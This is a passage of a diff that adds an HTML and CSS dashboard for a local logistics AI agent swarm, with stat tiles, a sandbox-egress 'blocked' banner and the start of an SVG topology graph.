@@ -1,0 +1,2280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MISSION CONTROL · Northwind Logistics</title>
+  <meta name="description" content="Cinematic dark-theme command-center UI for a swarm of local AI agents running logistics operations.">
+  <meta property="og:title" content="MISSION CONTROL · Northwind Logistics">
+  <meta property="og:description" content="Cinematic dark-theme command center UI for local logistics AI agent swarms.">
+  <meta property="og:type" content="website">
+  <meta name="twitter:card" content="summary_large_image">
+  <style>
+    /* ==========================================================================
+       MISSION CONTROL · NORTHWIND LOGISTICS · ZERO-DEPENDENCY STYLING
+       ========================================================================== */
+    :root {
+      --bg-space: #050811;
+      --bg-panel: rgba(10, 18, 36, 0.78);
+      --bg-panel-solid: #0b1426;
+      --border-panel: rgba(0, 240, 255, 0.16);
+      --border-panel-bright: rgba(0, 240, 255, 0.35);
+
+      --color-cyan: #00f0ff;
+      --color-cyan-glow: rgba(0, 240, 255, 0.45);
+      --color-green: #00ff88;
+      --color-green-glow: rgba(0, 255, 136, 0.45);
+      --color-amber: #ffb700;
+      --color-amber-glow: rgba(255, 183, 0, 0.45);
+      --color-red: #ff2a55;
+      --color-red-glow: rgba(255, 42, 85, 0.55);
+      --color-purple: #b55fe6;
+      --color-text-bright: #f0f6fc;
+      --color-text-main: #c9d1d9;
+      --color-text-dim: #7d8b99;
+      --color-text-dark: #4b5866;
+
+      --font-mono: ui-monospace, "SF Mono", "Cascadia Code", "Roboto Mono", Menlo, Monaco, Consolas, monospace;
+      --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      user-select: none;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background-color: var(--bg-space);
+      color: var(--color-text-main);
+      font-family: var(--font-sans);
+      font-size: 13px;
+      line-height: 1.4;
+    }
+
+    /* Ambient cybernetic grid and vignette */
+    body::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background-image: 
+        linear-gradient(rgba(0, 240, 255, 0.035) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0, 240, 255, 0.035) 1px, transparent 1px);
+      background-size: 36px 36px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    body::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle at 50% 50%, transparent 60%, rgba(3, 6, 14, 0.85) 100%);
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    /* Command Center App Grid */
+    #app-container {
+      position: relative;
+      z-index: 2;
+      width: 100vw;
+      height: 100vh;
+      display: grid;
+      grid-template-rows: 52px 76px 1fr 64px 22px;
+      grid-template-columns: 1fr 390px;
+      gap: 8px;
+      padding: 10px 14px 8px 14px;
+    }
+
+    /* Header */
+    #header-bar {
+      grid-column: 1 / 3;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 16px;
+      background: var(--bg-panel);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      border: 1px solid var(--border-panel);
+      border-radius: 4px;
+      position: relative;
+    }
+
+    .brand-group {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .brand-icon {
+      width: 28px;
+      height: 28px;
+      border: 1px solid var(--color-cyan);
+      border-radius: 3px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(0, 240, 255, 0.08);
+      box-shadow: 0 0 12px rgba(0, 240, 255, 0.25);
+    }
+
+    .brand-title {
+      font-family: var(--font-mono);
+      font-weight: 700;
+      font-size: 15px;
+      letter-spacing: 1.5px;
+      color: var(--color-text-bright);
+      text-transform: uppercase;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .brand-title .accent {
+      color: var(--color-cyan);
+      text-shadow: 0 0 10px var(--color-cyan-glow);
+    }
+
+    .brand-title .dim {
+      color: var(--color-text-dim);
+      font-weight: 400;
+    }
+
+    .header-status-group {
+      display: flex;
+      align-items: center;
+      gap: 18px;
+      font-family: var(--font-mono);
+    }
+
+    /* Pulsing offline badge */
+    .offline-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 4px 10px;
+      background: rgba(0, 255, 136, 0.08);
+      border: 1px solid rgba(0, 255, 136, 0.35);
+      border-radius: 3px;
+      font-size: 11px;
+      font-weight: 600;
+      letter-spacing: 0.8px;
+      color: var(--color-green);
+    }
+
+    .pulsing-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--color-green);
+      box-shadow: 0 0 8px var(--color-green);
+      animation: pulse-dot 1.8s infinite ease-in-out;
+    }
+
+    @keyframes pulse-dot {
+      0%, 100% { transform: scale(0.9); opacity: 0.7; box-shadow: 0 0 4px var(--color-green); }
+      50% { transform: scale(1.3); opacity: 1; box-shadow: 0 0 12px var(--color-green); }
+    }
+
+    /* Mock Mode Badge */
+    #mock-badge {
+      display: none;
+      align-items: center;
+      gap: 6px;
+      padding: 3px 8px;
+      background: rgba(255, 183, 0, 0.12);
+      border: 1px solid rgba(255, 183, 0, 0.45);
+      border-radius: 3px;
+      color: var(--color-amber);
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      animation: badge-pulse 2s infinite ease-in-out;
+    }
+
+    @keyframes badge-pulse {
+      0%, 100% { opacity: 0.85; }
+      50% { opacity: 1; text-shadow: 0 0 8px var(--color-amber-glow); }
+    }
+
+    .clock-display {
+      font-family: var(--font-mono);
+      font-size: 12px;
+      color: var(--color-text-bright);
+      letter-spacing: 1px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(0, 0, 0, 0.35);
+      padding: 4px 10px;
+      border-radius: 3px;
+      border: 1px solid rgba(255, 255, 255, 0.06);
+    }
+
+    .clock-display .utc {
+      color: var(--color-text-dim);
+      font-size: 10px;
+    }
+
+    /* Stat Tiles */
+    #stat-tiles-bar {
+      grid-column: 1 / 3;
+      display: grid;
+      grid-template-columns: repeat(6, 1fr);
+      gap: 8px;
+    }
+
+    .stat-card {
+      background: var(--bg-panel);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border: 1px solid var(--border-panel);
+      border-radius: 4px;
+      padding: 8px 14px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      position: relative;
+      overflow: hidden;
+      transition: border-color 0.3s, box-shadow 0.3s;
+    }
+
+    .stat-card::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 2px;
+      background: currentColor;
+      opacity: 0.85;
+      box-shadow: 0 0 10px currentColor;
+    }
+
+    .stat-card.color-cyan { color: var(--color-cyan); }
+    .stat-card.color-green { color: var(--color-green); }
+    .stat-card.color-amber { color: var(--color-amber); }
+    .stat-card.color-purple { color: var(--color-purple); }
+    .stat-card.color-red { color: var(--color-text-dim); }
+    .stat-card.color-red.active-alert {
+      color: var(--color-red);
+      border-color: rgba(255, 42, 85, 0.6);
+      box-shadow: 0 0 18px rgba(255, 42, 85, 0.35);
+      animation: alert-card-pulse 1.6s infinite ease-in-out;
+    }
+    .stat-card.color-error { color: #f87171; }
+
+    @keyframes alert-card-pulse {
+      0%, 100% { border-color: rgba(255, 42, 85, 0.45); }
+      50% { border-color: rgba(255, 42, 85, 0.9); }
+    }
+
+    .stat-label {
+      font-family: var(--font-mono);
+      font-size: 10px;
+      text-transform: uppercase;
+      letter-spacing: 1.2px;
+      color: var(--color-text-dim);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .stat-value {
+      font-family: var(--font-mono);
+      font-size: 26px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+      color: var(--color-text-bright);
+      line-height: 1.1;
+      margin-top: 2px;
+    }
+
+    .stat-card.color-red.active-alert .stat-value {
+      color: var(--color-red);
+      text-shadow: 0 0 14px var(--color-red-glow);
+    }
+
+    .stat-footer {
+      font-family: var(--font-mono);
+      font-size: 9.5px;
+      color: var(--color-text-dark);
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      margin-top: 2px;
+    }
+
+    /* Center: Node Graph Panel */
+    #graph-panel {
+      grid-column: 1 / 2;
+      grid-row: 3 / 4;
+      background: var(--bg-panel);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      border: 1px solid var(--border-panel);
+      border-radius: 4px;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .panel-header-corner {
+      position: absolute;
+      top: 10px;
+      left: 14px;
+      z-index: 10;
+      font-family: var(--font-mono);
+      font-size: 10.5px;
+      color: var(--color-text-dim);
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      pointer-events: none;
+    }
+
+    .panel-header-corner .tag {
+      background: rgba(0, 240, 255, 0.08);
+      border: 1px solid rgba(0, 240, 255, 0.25);
+      color: var(--color-cyan);
+      padding: 2px 6px;
+      border-radius: 2px;
+      font-size: 9px;
+    }
+
+    #svg-stage {
+      width: 100%;
+      height: 100%;
+      display: block;
+      transition: transform 0.08s ease-in-out;
+    }
+
+    /* Dramatic graph shake on blocked */
+    .shake-graph {
+      animation: graph-shake 0.45s cubic-bezier(.36,.07,.19,.97) both;
+    }
+
+    @keyframes graph-shake {
+      10%, 90% { transform: translate3d(-3px, 1px, 0); }
+      20%, 80% { transform: translate3d(5px, -2px, 0); }
+      30%, 50%, 70% { transform: translate3d(-6px, 3px, 0); }
+      40%, 60% { transform: translate3d(6px, -3px, 0); }
+    }
+
+    /* Dramatic Blocked Warning Banner */
+    #blocked-banner-container {
+      position: absolute;
+      top: 18px;
+      left: 50%;
+      transform: translateX(-50%) translateY(-140%);
+      z-index: 50;
+      width: 86%;
+      max-width: 760px;
+      background: rgba(180, 10, 30, 0.96);
+      border: 2px solid #ff4466;
+      box-shadow: 0 0 45px rgba(255, 42, 85, 0.75), inset 0 0 20px rgba(0, 0, 0, 0.5);
+      border-radius: 6px;
+      padding: 14px 20px;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      transition: transform 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      pointer-events: none;
+    }
+
+    #blocked-banner-container.visible {
+      transform: translateX(-50%) translateY(0);
+      pointer-events: auto;
+    }
+
+    .banner-main {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .banner-icon {
+      font-size: 26px;
+      line-height: 1;
+      animation: pulse-icon 0.8s infinite alternate;
+    }
+
+    @keyframes pulse-icon {
+      0% { transform: scale(1); filter: drop-shadow(0 0 4px #fff); }
+      100% { transform: scale(1.15); filter: drop-shadow(0 0 12px #fff); }
+    }
+
+    .banner-text-group {
+      flex: 1;
+    }
+
+    .banner-title {
+      font-family: var(--font-mono);
+      font-size: 15px;
+      font-weight: 800;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      color: #ffffff;
+      text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
+    }
+
+    .banner-detail {
+      font-size: 12.5px;
+      color: #ffe0e6;
+      margin-top: 2px;
+      line-height: 1.3;
+    }
+
+    .banner-host {
+      font-family: var(--font-mono);
+      font-size: 11px;
+      color: #ffd1dc;
+      background: rgba(0, 0, 0, 0.35);
+      padding: 2px 7px;
+      border-radius: 3px;
+      display: inline-block;
+      margin-top: 3px;
+    }
+
+    .banner-progress-bar {
+      width: 100%;
+      height: 3px;
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 2px;
+      overflow: hidden;
+      margin-top: 4px;
+    }
+
+    .banner-progress-fill {
+      height: 100%;
+      width: 100%;
+      background: #ffffff;
+      box-shadow: 0 0 8px #ffffff;
+      transform-origin: left;
+    }
+
+    /* Right Sidebar: Live Event Log */
+    #sidebar-panel {
+      grid-column: 2 / 3;
+      grid-row: 3 / 4;
+      background: var(--bg-panel);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      border: 1px solid var(--border-panel);
+      border-radius: 4px;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .sidebar-header {
+      padding: 10px 14px;
+      border-bottom: 1px solid var(--border-panel);
+      background: rgba(0, 0, 0, 0.25);
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .sidebar-title-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .sidebar-title {
+      font-family: var(--font-mono);
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 1.2px;
+      text-transform: uppercase;
+      color: var(--color-text-bright);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .log-counter {
+      font-family: var(--font-mono);
+      font-size: 10px;
+      color: var(--color-cyan);
+      background: rgba(0, 240, 255, 0.08);
+      padding: 1px 6px;
+      border-radius: 2px;
+      border: 1px solid rgba(0, 240, 255, 0.2);
+    }
+
+    /* Log Filter Pills */
+    .filter-tabs {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      overflow-x: auto;
+      scrollbar-width: none;
+    }
+
+    .filter-tab {
+      background: transparent;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 3px;
+      color: var(--color-text-dim);
+      font-family: var(--font-mono);
+      font-size: 9.5px;
+      padding: 2px 7px;
+      cursor: pointer;
+      text-transform: uppercase;
+      letter-spacing: 0.6px;
+      transition: all 0.15s;
+    }
+
+    .filter-tab:hover {
+      background: rgba(255, 255, 255, 0.05);
+      color: var(--color-text-bright);
+    }
+
+    .filter-tab.active {
+      background: rgba(0, 240, 255, 0.12);
+      border-color: var(--color-cyan);
+      color: var(--color-cyan);
+      box-shadow: 0 0 8px rgba(0, 240, 255, 0.25);
+    }
+
+    /* Log list */
+    #log-list {
+      flex: 1;
+      overflow-y: auto;
+      overflow-x: hidden;
+      padding: 6px 8px;
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+      scrollbar-width: thin;
+      scrollbar-color: rgba(0, 240, 255, 0.2) transparent;
+    }
+
+    #log-list::-webkit-scrollbar {
+      width: 4px;
+    }
+
+    #log-list::-webkit-scrollbar-thumb {
+      background: rgba(0, 240, 255, 0.25);
+      border-radius: 2px;
+    }
+
+    .log-item {
+      background: rgba(7, 14, 28, 0.7);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-left: 3px solid var(--color-cyan);
+      border-radius: 3px;
+      padding: 7px 9px;
+      display: flex;
+      flex-direction: column;
+      gap: 3px;
+      font-size: 11px;
+      animation: log-slide-in 0.22s ease-out;
+      transition: background 0.15s;
+    }
+
+    @keyframes log-slide-in {
+      from { opacity: 0; transform: translateY(-8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .log-item:hover {
+      background: rgba(14, 26, 48, 0.85);
+      border-color: rgba(0, 240, 255, 0.25);
+    }
+
+    .log-item.type-event { border-left-color: var(--color-cyan); }
+    .log-item.type-action { border-left-color: var(--color-green); }
+    .log-item.type-handoff { border-left-color: var(--color-amber); }
+    .log-item.type-blocked {
+      border-left-color: var(--color-red);
+      background: rgba(45, 8, 18, 0.6);
+      border-top-color: rgba(255, 42, 85, 0.3);
+      border-bottom-color: rgba(255, 42, 85, 0.3);
+      box-shadow: 0 0 10px rgba(255, 42, 85, 0.2);
+    }
+    .log-item.type-error {
+      border-left-color: #f87171;
+      background: rgba(35, 10, 16, 0.5);
+    }
+
+    .log-header-line {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-family: var(--font-mono);
+      font-size: 10px;
+    }
+
+    .log-time {
+      color: var(--color-text-dim);
+    }
+
+    .log-tags {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .log-badge {
+      font-size: 9px;
+      font-weight: 700;
+      text-transform: uppercase;
+      padding: 1px 4px;
+      border-radius: 2px;
+      letter-spacing: 0.5px;
+    }
+
+    .log-badge.badge-event { color: var(--color-cyan); background: rgba(0, 240, 255, 0.1); }
+    .log-badge.badge-action { color: var(--color-green); background: rgba(0, 255, 136, 0.1); }
+    .log-badge.badge-handoff { color: var(--color-amber); background: rgba(255, 183, 0, 0.12); }
+    .log-badge.badge-blocked { color: #ffffff; background: var(--color-red); }
+    .log-badge.badge-error { color: #f87171; background: rgba(248, 113, 113, 0.15); }
+
+    .agent-pill {
+      font-family: var(--font-mono);
+      font-size: 9px;
+      color: var(--color-text-main);
+      background: rgba(255, 255, 255, 0.06);
+      padding: 1px 5px;
+      border-radius: 2px;
+      text-transform: uppercase;
+    }
+
+    .log-detail-line {
+      color: var(--color-text-bright);
+      line-height: 1.35;
+      word-break: break-word;
+      font-size: 11px;
+    }
+
+    .log-extra-line {
+      font-family: var(--font-mono);
+      font-size: 9.5px;
+      color: var(--color-text-dim);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .log-extra-line .highlight {
+      color: var(--color-cyan);
+    }
+
+    /* Bottom Control & Telemetry Strip */
+    #bottom-bar {
+      grid-column: 1 / 3;
+      background: var(--bg-panel);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      border: 1px solid var(--border-panel);
+      border-radius: 4px;
+      padding: 8px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 20px;
+    }
+
+    .telemetry-group {
+      display: flex;
+      align-items: center;
+      gap: 22px;
+      font-family: var(--font-mono);
+    }
+
+    .telem-item {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+    }
+
+    .telem-label {
+      font-size: 9.5px;
+      color: var(--color-text-dim);
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+    }
+
+    .telem-val {
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--color-text-bright);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .telem-val .accent-cyan { color: var(--color-cyan); }
+    .telem-val .accent-green { color: var(--color-green); }
+
+    /* Memory Bar */
+    .mem-bar-wrapper {
+      width: 110px;
+      height: 7px;
+      background: rgba(0, 0, 0, 0.4);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 2px;
+      overflow: hidden;
+      margin-top: 3px;
+    }
+
+    .mem-bar-fill {
+      height: 100%;
+      width: 50%;
+      background: linear-gradient(90deg, var(--color-cyan), var(--color-green));
+      box-shadow: 0 0 6px var(--color-cyan-glow);
+      transition: width 0.4s ease;
+    }
+
+    /* Chaos Buttons */
+    .chaos-buttons-group {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .btn-tactical {
+      font-family: var(--font-mono);
+      font-size: 10.5px;
+      font-weight: 700;
+      letter-spacing: 0.8px;
+      text-transform: uppercase;
+      padding: 7px 12px;
+      background: rgba(14, 26, 48, 0.9);
+      border: 1px solid rgba(0, 240, 255, 0.3);
+      color: var(--color-cyan);
+      border-radius: 3px;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.15s ease-in-out;
+      outline: none;
+    }
+
+    .btn-tactical:hover {
+      background: rgba(0, 240, 255, 0.15);
+      border-color: var(--color-cyan);
+      box-shadow: 0 0 12px rgba(0, 240, 255, 0.35);
+      transform: translateY(-1px);
+    }
+
+    .btn-tactical:active {
+      transform: translateY(1px);
+    }
+
+    .btn-tactical.danger {
+      border-color: rgba(255, 42, 85, 0.45);
+      color: #ff5e7e;
+      background: rgba(40, 10, 20, 0.7);
+    }
+
+    .btn-tactical.danger:hover {
+      background: rgba(255, 42, 85, 0.22);
+      border-color: var(--color-red);
+      color: #ffffff;
+      box-shadow: 0 0 14px var(--color-red-glow);
+    }
+
+    .btn-tactical.toggle.paused {
+      background: rgba(255, 183, 0, 0.18);
+      border-color: var(--color-amber);
+      color: var(--color-amber);
+    }
+
+    /* Footer line */
+    #footer-strip {
+      grid-column: 1 / 3;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-family: var(--font-mono);
+      font-size: 9.5px;
+      color: var(--color-text-dark);
+      padding: 0 6px;
+      letter-spacing: 0.8px;
+    }
+
+    #footer-strip .accent-footer {
+      color: var(--color-text-dim);
+    }
+
+    /* SVG Node Styling */
+    .node-box {
+      cursor: default;
+      transition: filter 0.3s ease;
+    }
+
+    .node-bg {
+      fill: #081122;
+      stroke: rgba(0, 240, 255, 0.28);
+      stroke-width: 1.5;
+      rx: 6;
+      transition: stroke 0.25s, fill 0.25s;
+    }
+
+    .node-box:hover .node-bg {
+      stroke: var(--color-cyan);
+    }
+
+    .node-header-bg {
+      fill: rgba(0, 240, 255, 0.08);
+    }
+
+    .node-title {
+      font-family: var(--font-mono);
+      font-weight: 700;
+      font-size: 13px;
+      fill: #ffffff;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+    }
+
+    .node-subtitle {
+      font-family: var(--font-mono);
+      font-size: 10px;
+      fill: #8b9bb4;
+      letter-spacing: 0.5px;
+    }
+
+    .node-badge-text {
+      font-family: var(--font-mono);
+      font-size: 9px;
+      font-weight: 700;
+      fill: var(--color-cyan);
+    }
+
+    .node-status-circle {
+      fill: var(--color-green);
+      filter: drop-shadow(0 0 4px var(--color-green));
+    }
+
+    /* Active Highlight States on SVG Nodes */
+    .node-box.highlight-event .node-bg {
+      stroke: var(--color-cyan) !important;
+      fill: #0c1b33 !important;
+      filter: drop-shadow(0 0 16px rgba(0, 240, 255, 0.7));
+    }
+
+    .node-box.highlight-action .node-bg {
+      stroke: var(--color-green) !important;
+      fill: #0a1f1b !important;
+      filter: drop-shadow(0 0 16px rgba(0, 255, 136, 0.7));
+    }
+
+    .node-box.highlight-handoff .node-bg {
+      stroke: var(--color-amber) !important;
+      fill: #221d0a !important;
+      filter: drop-shadow(0 0 16px rgba(255, 183, 0, 0.7));
+    }
+
+    .node-box.highlight-blocked .node-bg {
+      stroke: var(--color-red) !important;
+      fill: #2a0b12 !important;
+      filter: drop-shadow(0 0 24px rgba(255, 42, 85, 0.9));
+    }
+
+    /* SVG Connecting Paths */
+    .wire-path {
+      fill: none;
+      stroke: rgba(0, 240, 255, 0.15);
+      stroke-width: 2;
+      stroke-dasharray: 4, 4;
+    }
+
+    .wire-path-glow {
+      fill: none;
+      stroke: rgba(0, 240, 255, 0.05);
+      stroke-width: 6;
+    }
+
+    .wire-handoff {
+      fill: none;
+      stroke: rgba(255, 183, 0, 0.16);
+      stroke-width: 2;
+      stroke-dasharray: 3, 3;
+    }
+
+    /* Dynamic SVG Pulse Particles */
+    .pulse-particle {
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+  <div id="app-container">
+    <!-- Top Header -->
+    <header id="header-bar">
+      <div class="brand-group">
+        <div class="brand-icon">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#00f0ff" stroke-width="2">
+            <polygon points="12 2 2 7 12 12 22 7 12 2"></polygon>
+            <polyline points="2 17 12 22 22 17"></polyline>
+            <polyline points="2 12 12 17 22 12"></polyline>
+          </svg>
+        </div>
+        <div class="brand-title">
+          <span>MISSION CONTROL</span>
+          <span class="dim">·</span>
+          <span class="accent">Northwind Logistics</span>
+          <span class="dim">·</span>
+          <span>100% local</span>
+        </div>
+      </div>
+
+      <div class="header-status-group">
+        <div id="mock-badge">[ MOCK DATA ACTIVE ]</div>
+        <div class="offline-badge">
+          <span class="pulsing-dot"></span>
+          <span>OFFLINE-CAPABLE</span>
+        </div>
+        <div class="clock-display">
+          <span id="clock-time">00:00:00</span>
+          <span class="utc" id="clock-utc">UTC+0</span>
+        </div>
+      </div>
+    </header>
+
+    <!-- Top Stat Tiles -->
+    <section id="stat-tiles-bar">
+      <div class="stat-card color-cyan" id="card-events">
+        <div class="stat-label">
+          <span>Total Ingress</span>
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>
+        </div>
+        <div class="stat-value" id="val-events">0</div>
+        <div class="stat-footer">Events received</div>
+      </div>
+
+      <div class="stat-card color-green" id="card-resolved">
+        <div class="stat-label">
+          <span>Resolved</span>
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+        </div>
+        <div class="stat-value" id="val-resolved">0</div>
+        <div class="stat-footer">Operations finalized</div>
+      </div>
+
+      <div class="stat-card color-amber" id="card-escalated">
+        <div class="stat-label">
+          <span>Escalated</span>
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path></svg>
+        </div>
+        <div class="stat-value" id="val-escalated">0</div>
+        <div class="stat-footer">Human-in-loop required</div>
+      </div>
+
+      <div class="stat-card color-purple" id="card-rerouted">
+        <div class="stat-label">
+          <span>Rerouted</span>
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 3 21 3 21 8"></polyline><line x1="4" y1="20" x2="21" y2="3"></line><polyline points="21 16 21 21 16 21"></polyline><line x1="15" y1="15" x2="21" y2="21"></line><line x1="4" y1="4" x2="9" y2="9"></line></svg>
+        </div>
+        <div class="stat-value" id="val-rerouted">0</div>
+        <div class="stat-footer">Autonomous route shifts</div>
+      </div>
+
+      <div class="stat-card color-red" id="card-blocked">
+        <div class="stat-label">
+          <span>Blocked</span>
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"></line></svg>
+        </div>
+        <div class="stat-value" id="val-blocked">0</div>
+        <div class="stat-footer" id="blocked-sub">Sandbox egress violations</div>
+      </div>
+
+      <div class="stat-card color-error" id="card-errors">
+        <div class="stat-label">
+          <span>Errors</span>
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
+        </div>
+        <div class="stat-value" id="val-errors">0</div>
+        <div class="stat-footer">Execution faults</div>
+      </div>
+    </section>
+
+    <!-- Center: Node Graph Panel -->
+    <main id="graph-panel">
+      <div class="panel-header-corner">
+        <span>Swarm Topology</span>
+        <span class="tag">Zero-Egress Zone</span>
+      </div>
+
+      <!-- Dramatic Red Blocked Banner -->
+      <div id="blocked-banner-container">
+        <div class="banner-main">
+          <div class="banner-icon">&#x26A0;</div>
+          <div class="banner-text-group">
+            <div class="banner-title" id="banner-title-text">SECURITY POLICY BLOCKED EGRESS</div>
+            <div class="banner-detail" id="banner-detail-text">Outbound unauthorized call was quarantined.</div>
+            <div class="banner-host" id="banner-host-text">DESTINATION: unknown</div>
+          </div>
+        </div>
+        <div class="banner-progress-bar">
+          <div class="banner-progress-fill" id="banner-progress"></div>
+        </div>
+      </div>
+
+      <!-- SVG Topology Canvas -->
+      <svg id="svg-stage" viewBox="0 0 1000 580" preserveAspectRatio="xMidYMid meet">
+        <defs>
+          <!-- Neon Glow Filters -->
+          <filter id="glow-cyan" x="-20%" y="-20%" width="140%" height="140%">
+            <feGaussianBlur stdDeviation="3" result="blur"></feGaussianBlur>
+            <feMerge>
+              <feMergeNode in="blur"></feMergeNode>
+              <feMergeNode in="SourceGraphic"></feMergeNode>
+            </feMerge>
+          </filter>
+
+          <filter id="glow-green" x="-20%" y="-20%" width="140%" height="140%">
+            <feGaussianBlur stdDeviation="4" result="blur"></feGaussianBlur>
+            <feMerge>
+              <feMergeNode in="blur"></feMergeNode>
+              <feMergeNode in="SourceGraphic"></feMergeNode>
+            </feMerge>
+          </filter>
+
+          <filter id="glow-red" x="-30%" y="-30%" width="160%" height="160%">
+            <feGaussianBlur stdDeviation="7" result="blur"></feGaussianBlur>
+            <feMerge>
+              <feMergeNode in="blur"></feMergeNode>
+              <feMergeNode in="SourceGraphic"></feMergeNode>
+            </feMerge>
+          </filter>
+
+          <filter id="glow-amber" x="-20%" y="-20%" width="140%" height="140%">
+            <feGaussianBlur stdDeviation="4" result="blur"></feGaussianBlur>
+            <feMerge>
+              <feMergeNode in="blur"></feMergeNode>
+              <feMergeNode in="SourceGraphic"></feMergeNode>
+            </feMerge>
+          </filter>
+
+          <linearGradient id="grad-cyan-line" x1="0%" y1="0%" x2="100%" y2="0%">
+            <stop offset="0%" stop-color="#00f0ff" stop-opacity="0.8"/>
+            <stop offset="100%" stop-color="#00f0ff" stop-opacity="0.2"/>
+          </linearGradient>
+
+          <linearGradient id="grad-green-line" x1="0%" y1="0%" x2="100%" y2="0%">
+            <stop offset="0%" stop-color="#00ff88" stop-opacity="0.2"/>
+            <stop offset="100%" stop-color="#00ff88" stop-opacity="0.8"/>
+          </linearGradient>
+        </defs>
+
+        <!-- Dynamic Lines and Connections Layer -->
+        <g id="wires-layer">
+          <!-- Background Glow lines -->
+          <path id="wire-glow-stream-support" class="wire-path-glow" d="M 170 290 C 280 290, 320 130, 430 130" />
+          <path id="wire-glow-stream-procurement" class="wire-path-glow" d="M 170 290 C 290 290, 330 290, 430 290" />
+          <path id="wire-glow-stream-dispatch" class="wire-path-glow" d="M 170 290 C 280 290, 320 450, 430 450" />
+
+          <path id="wire-glow-support-sandbox" class="wire-path-glow" d="M 630 130 C 720 130, 750 290, 830 290" />
+          <path id="wire-glow-procurement-sandbox" class="wire-path-glow" d="M 630 290 C 730 290, 750 290, 830 290" />
+          <path id="wire-glow-dispatch-sandbox" class="wire-path-glow" d="M 630 450 C 720 450, 750 290, 830 290" />
+
